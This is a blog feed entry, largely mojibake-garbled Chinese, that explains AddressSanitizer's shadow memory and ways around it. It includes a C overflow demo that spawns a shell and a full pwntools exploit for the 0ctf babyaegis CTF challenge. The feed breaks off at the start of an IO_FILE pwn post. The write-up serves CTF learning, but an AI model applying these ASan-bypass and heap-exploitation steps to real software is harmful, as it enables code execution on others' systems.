        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="About-AddressSanitizer-ASan"><a href="#About-AddressSanitizer-ASan" class="headerlink" title="About AddressSanitizer(ASan)"></a>About AddressSanitizer(ASan)</h1><p>AddressSanitizer åæ–‡å‡ç®€ç§°ä¸ºASan æ˜¯ Google å¼€æºçš„ä¸€ä¸ªç”¨äºè¿›è¡Œå†…å­˜æ£€æµ‹çš„å·¥å…·ï¼ŒåŒ…æ‹¬ä½†å¯èƒ½ä¸é™äº Heap buffer overflow, Stack buffer overflow, Global buffer overflow ç­‰ç­‰ã€‚</p><p>åœ¨ wiki ä¸­å°±ä¸¾äº†äº†å››ä¸ªä¾‹å­ï¼Œåˆ†åˆ«æ˜¯</p><ol><li>Heap-use-after-free</li><li>Heap-buffer-overflow</li><li>Stack-buffer-overflow</li><li>Global-buffer-overflow</li></ol><p>é™¤äº†å­¦æœ¯ä¸Šçš„å»ºæ ‘ï¼Œè¿™ä¸ªå·¥å…·ä¹Ÿæ›¾å‘ç°äº†ä¸å°‘æ¼æ´ï¼Œå¦‚åœ¨çŸ¥åçš„ j00r çš„<a href="https://j00ru.vexillium.org/2014/01/ffmpeg-and-the-tale-of-a-thousand-fixes/">blog</a> ä¸­æåˆ°çš„</p><p>å…³äº ASan çš„æ ¸å¿ƒå®ç°åœ¨ wiki ä¹Ÿæåˆ°äº†ï¼Œåœ¨æˆ‘è¯»äº†ä¸€äº› paper ä»¥åŠåœ¨ 0ctf babyaegis è¿™ä¸ªé¢˜ç›®çš„è°ƒè¯•ä¹Ÿå¤§æ¦‚æ€»ç»“äº†ä¸€ä¸‹ï¼š</p><h2 id="ASan-ç®—æ³•å®ç°"><a href="#ASan-ç®—æ³•å®ç°" class="headerlink" title="ASan ç®—æ³•å®ç°"></a>ASan ç®—æ³•å®ç°</h2><p>ASan ç”±ä¸¤ä¸ªä¸»è¦éƒ¨åˆ†æ„æˆï¼Œæ’æ¡©å’ŒåŠ¨æ€è¿è¡Œåº“( Run-time library )ï¼Œæ’æ¡©ä¸»è¦æ˜¯é’ˆå¯¹åœ¨llvmç¼–è¯‘å™¨çº§åˆ«å¯¹è®¿é—®å†…å­˜çš„æ“ä½œ(storeï¼Œloadï¼Œallocaç­‰)ï¼Œå°†å®ƒä»¬è¿›è¡Œå¤„ç†ã€‚åŠ¨æ€è¿è¡Œåº“ä¸»è¦æä¾›ä¸€äº›è¿è¡Œæ—¶çš„å¤æ‚çš„åŠŸèƒ½(æ¯”å¦‚poison/unpoison shadow memory)ä»¥åŠå°†malloc,freeç­‰ç³»ç»Ÿè°ƒç”¨å‡½æ•°hookä½ã€‚å…¶å®è¯¥ç®—æ³•çš„æ€è·¯å¾ˆç®€å•ï¼Œå¦‚æœæƒ³é˜²ä½Buffer Overflowæ¼æ´ï¼Œåªéœ€è¦åœ¨æ¯å—å†…å­˜åŒºåŸŸå³ç«¯ï¼ˆæˆ–ä¸¤ç«¯ï¼Œèƒ½é˜²overflowå’Œunderflowï¼‰åŠ ä¸€å—åŒºåŸŸï¼ˆRedZoneï¼‰ï¼Œä½¿RedZoneçš„åŒºåŸŸçš„å½±å­å†…å­˜ï¼ˆShadow Memory)è®¾ç½®ä¸ºä¸å¯å†™å³å¯ã€‚</p><p>+â€”â€”â€”â€”â€”â€”-+<br>|     redzone          |<br>+â€”â€”â€”â€”â€”â€”-+<br>|       mem              |<br>+â€”â€”â€”â€”â€”â€”-+<br>|     redzone          |<br>+â€”â€”â€”â€”â€”â€”-+<br>|       mem              |<br>+â€”â€”â€”â€”â€”â€”-+<br>|     redzone          |<br>+â€”â€”â€”â€”â€”â€”-+</p><h3 id="å†…å­˜æ˜ å°„"><a href="#å†…å­˜æ˜ å°„" class="headerlink" title="å†…å­˜æ˜ å°„"></a>å†…å­˜æ˜ å°„</h3><p>AddressSanitizerä¿æŠ¤çš„ä¸»è¦åŸç†æ˜¯å¯¹ç¨‹åºä¸­çš„è™šæ‹Ÿå†…å­˜æä¾›ç²—ç²’åº¦çš„å½±å­å†…å­˜(æ²¡8ä¸ªå­—èŠ‚çš„å†…å­˜å¯¹åº”ä¸€ä¸ªå­—èŠ‚çš„å½±å­å†…å­˜)ï¼Œä¸ºäº†å‡å°‘overheadï¼Œå°±é‡‡ç”¨äº†ç›´æ¥å†…å­˜æ˜ å°„ç­–ç•¥ï¼Œæ‰€é‡‡ç”¨çš„å…·ä½“ç­–ç•¥å¦‚ä¸‹ï¼šShadow=(Mem &gt;&gt; 3) + offsetã€‚æ¯8ä¸ªå­—èŠ‚çš„å†…å­˜å¯¹åº”ä¸€ä¸ªå­—èŠ‚çš„å½±å­å†…å­˜ï¼Œå½±å­å†…å­˜ä¸­æ¯ä¸ªå­—èŠ‚å­˜å–ä¸€ä¸ªæ•°å­—k,å¦‚æœk=0ï¼Œåˆ™è¡¨ç¤ºè¯¥å½±å­å†…å­˜å¯¹åº”çš„8ä¸ªå­—èŠ‚çš„å†…å­˜éƒ½èƒ½è®¿é—®ã€‚<br>å¦‚æœkåœ¨0åˆ°7ä¹‹é—´,è¡¨ç¤ºå‰kä¸ªå­—èŠ‚å¯ä»¥è®¿é—®ï¼Œå¦‚æœkä¸ºè´Ÿæ•°ï¼Œä¸åŒçš„æ•°å­—è¡¨ç¤ºä¸åŒçš„é”™è¯¯ï¼ˆe.g. Stack buffer overflow, Heap buffer overflow)ã€‚å…·ä½“çš„æ˜ å°„ç­–ç•¥å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><h4 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x7fff8000;</span><br></pre></td></tr></table></figure><table><thead><tr><th>[0x10007fff8000, 0x7fffffffffff]</th><th>HighMem</th></tr></thead><tbody><tr><td>[0x02008fff7000, 0x10007fff7fff]</td><td>HighShadow</td></tr><tr><td>[0x00008fff7000, 0x02008fff6fff]</td><td>ShadowGap</td></tr><tr><td>[0x00007fff8000, 0x00008fff6fff]</td><td>LowShadow</td></tr><tr><td>[0x000000000000, 0x00007fff7fff]</td><td>LowMem</td></tr></tbody></table><h4 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x20000000;</span><br></pre></td></tr></table></figure><table><thead><tr><th>[0x40000000, 0xffffffff]</th><th>HighMem</th></tr></thead><tbody><tr><td>[0x28000000, 0x3fffffff]</td><td>HighShadow</td></tr><tr><td>[0x24000000, 0x27ffffff]</td><td>ShadowGap</td></tr><tr><td>[0x20000000, 0x23ffffff]</td><td>LowShadow</td></tr><tr><td>[0x00000000, 0x1fffffff]</td><td>LowMem</td></tr></tbody></table><h1 id="Bypassing-AddressSanitizer"><a href="#Bypassing-AddressSanitizer" class="headerlink" title="Bypassing AddressSanitizer"></a>Bypassing AddressSanitizer</h1><p>æ˜¾è€Œæ˜“è§çš„æ˜¯ï¼ŒASan çš„æ£€æŸ¥å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯åŸºäºå½±å­å†…å­˜ä¸­ï¼Œæ­¤æ—¶å½±å­å†…å­˜çš„flagå€¼ã€‚å‡è®¾å¦‚æœå…¨æ®µå½±å­å†…å­˜çš„ flag å…¨ä¸º0ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®Œå…¨æ— è§†æ‰ASanï¼Œè€Œ0ctf çš„ babyaegisï¼Œæ­£æ˜¯ç»™äº†ä¸€ä¸ªå†™0çš„æœºä¼šï¼Œç»™äº†æˆ‘ä»¬ä¸€æ¬¡å¯¹ä¸€ä¸ªæŒ‡é’ˆå†æ¬¡è¯»å†™çš„æœºä¼šã€‚</p><p>æ­¤å¤–è¿˜æœ‰å‡ ç§æ–¹æ³•ï¼Œæ¯”å¦‚</p><h3 id="Adjacent-Buffers-in-the-Same-Struct-Class"><a href="#Adjacent-Buffers-in-the-Same-Struct-Class" class="headerlink" title="Adjacent Buffers in the Same Struct/Class"></a>Adjacent Buffers in the Same Struct/Class</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ cat test1.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Test()&#123;</span><br><span class="line"> command[<span class="number">0</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line"> command[<span class="number">1</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"> command[<span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line"> system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> command[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> Test aTest = Test();</span><br><span class="line"> aTest.a();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ localhost in /tmp [1:42:48]</span></span><br><span class="line">$ g++ -O -g -fsanitize=address test1.c</span><br><span class="line">clang: warning: treating <span class="string">&#x27;c&#x27;</span> input as <span class="string">&#x27;c++&#x27;</span> when <span class="keyword">in</span> C++ mode, this behavior is deprecated [-Wdeprecated]</span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ localhost in /tmp [1:43:10]</span></span><br><span class="line">$ ./a.out</span><br><span class="line">aaaaaaaaaa/bin/sh;</span><br><span class="line">sh-3.2$ id</span><br><span class="line">uid=501(swing) gid=20(staff) groups=20(staff),701(com.apple.sharepoint.group.1),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh-disabled)</span><br><span class="line">sh-3.2$</span><br></pre></td></tr></table></figure><p>å‰©ä¸‹è§ PDFï¼š <a href="https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf">https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf</a></p><div class="row">    <embed src="https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf" width="100%" height="550" type="application/pdf"></div><h1 id="0ctf-babyaegis"><a href="#0ctf-babyaegis" class="headerlink" title="0ctf babyaegis"></a>0ctf babyaegis</h1><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@linuxkit-025000000001 /pwn<span class="comment"># checksec aegis</span></span><br><span class="line">[*] <span class="string">&#x27;/pwn/aegis&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line">    ASAN:     Enabled</span><br><span class="line">    UBSAN:    Enabled   </span><br></pre></td></tr></table></figure><p>   å¼€äº† ASan </p><p>  å½±å­å†…å­˜ä½ç½®ï¼š mem &gt;&gt; 3) + 0x7FFF8000LL</p><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>åœ¨updateä¸­ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023314.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023314.png"></a></p><p>åœ¨deleteä¸­</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023349.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023349.png"></a></p><p>å­˜åœ¨uaf</p><p>æ­¤å¤–ï¼Œå­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•°ä¸ºï¼šsecretå‡½æ•°</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023617.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190409023617.png"></a></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å¯ä»¥å…ˆç½®checkerä¸º0ä½¿å¾—æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸ªå †æº¢å‡ºæ”¹sizeå€¼ä¸º0ï¼Œæ¥ä¸‹æ¥åœ¨åšä¸€æ¬¡æ›´æ”¹ï¼Œè¿™æ¬¡å¯ä»¥æº¢å‡ºæ›´å¤šï¼Œæ”¹sizeä¸ºæ›´å¤§çš„å€¼ã€‚ç„¶årmäº†è¿™ä¸ªå †å—å†mallocå‡ºæ¥å°±å¯ä»¥é€ æˆä¸€ä¸ªuafçš„æ•ˆæœã€‚æ¥ç€åˆ©ç”¨uafçš„æŒ‡é’ˆæ³„æ¼å„ç§program base å’Œlibc baseä»€ä¹ˆçš„ä¸œè¥¿ã€‚ç„¶ååˆ©ç”¨æŒ‡é’ˆå»æ”¹å†™bssæ®µä¸Šçš„å€¼å¯¼è‡´__sanitizer::Die()å‡½æ•°å†…éƒ¨call rax è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„å‡½æ•°ã€‚è¿™é‡Œæœ¬æ¥æ˜¯æƒ³è°ƒç”¨onegadgetï¼Œä½†æ˜¯ä¸æ˜ç¡®ä¹Ÿæ²¡æ·±ç©¶ä¸ºä»€ä¹ˆonegadgetæ²¡èµ·ä½œç”¨ã€‚ä¹‹åæ­¤å¤„æ”¹å†™ä¸ºgetsæ§åˆ¶ç¨‹åºæµç„¶åæ„æˆæ ˆæº¢å‡ºè¦†ç›–retä¸ºonegadgetæ¥ç€å°±getshelläº†</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;notiterm&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;iterm&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;notiterm&#x27;, &#x27;-t&#x27;, &#x27;iterm&#x27;, &#x27;-p&#x27;, &#x27;15112&#x27;, &#x27;-e&#x27;] # use 50806 port as an example</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./aegis&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=process(&#x27;./aegis&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;111.186.63.209&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu_enter</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">sz,content,id</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    pu_enter(str(sz))</span><br><span class="line">    get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;ID&#x27;</span>)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx,content,id</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;New ID:&#x27;</span>)</span><br><span class="line">    pu_enter(str(id))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(str(idx))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>(<span class="params">addr</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Lucky Number: &#x27;</span>)</span><br><span class="line">    pu_enter(str(addr))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x123456789abcdef</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>,<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x602000000000</span></span><br><span class="line"><span class="comment">#0x7fff8000</span></span><br><span class="line">secret(<span class="number">0xc047fff8008</span><span class="number">-4</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x12</span>,<span class="number">0x123456789</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x02ffffff00000002</span>)[:<span class="number">7</span>],<span class="number">0x01f000ff1002ff</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x602000000018</span>),<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">pbase = addr <span class="number">-0x114AB0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x347DF0</span>)[:<span class="number">2</span>],(pbase+<span class="number">0x347DF0</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = addr <span class="number">-0xE4FA0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x0FB08A0</span>),p64(pbase+<span class="number">0x7AE140</span>))</span><br><span class="line"><span class="comment">#update(5,p64(pbase+0xfb08a0+0x28),(pbase+0xfb08a0+0x28)&gt;&gt;8)</span></span><br><span class="line">raw_input(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line"><span class="comment">#raw_input(hex(pbase+0x7AE140))</span></span><br><span class="line">pu(p64(base+<span class="number">524464</span>)[:<span class="number">7</span>])</span><br><span class="line"><span class="comment">#get(&#x27;ID&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&quot;#get&quot;</span>+str(hex(pbase+<span class="number">0x7AE140</span>)))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">471</span>+p64(base+<span class="number">0x4f322</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x100</span></span><br><span class="line"><span class="comment">#raw_input(hex(base + 0x4f322))</span></span><br><span class="line">pu_enter(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(lbase))</span></span><br><span class="line"><span class="comment">#print(hex(stack))</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">github-AddressSanitizer</a></p><p><a href="https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf">AddressSanitizer: A Fast Address Sanity Checker</a></p><p><a href="https://blog.csdn.net/pang241/article/details/76137969">AddressSanitizerç®—æ³•åŠæºç è§£æ</a></p><p><a href="https://blog.csdn.net/pang241/article/details/76137969">Bypassing AddressSanitizer</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Asan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE Pwn åˆ©ç”¨æ•´ç†</title>
      <link href="IO_FILE_Pwn.html"/>
      <url>IO_FILE_Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="0x01-seethefile"><a href="#0x01-seethefile" class="headerlink" title="0x01 seethefile"></a>0x01 seethefile</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¨‹åºä¸»è¦æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">     openfile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">     readfile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">     writefile();</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">     closefile();</span><br><span class="line">     <span 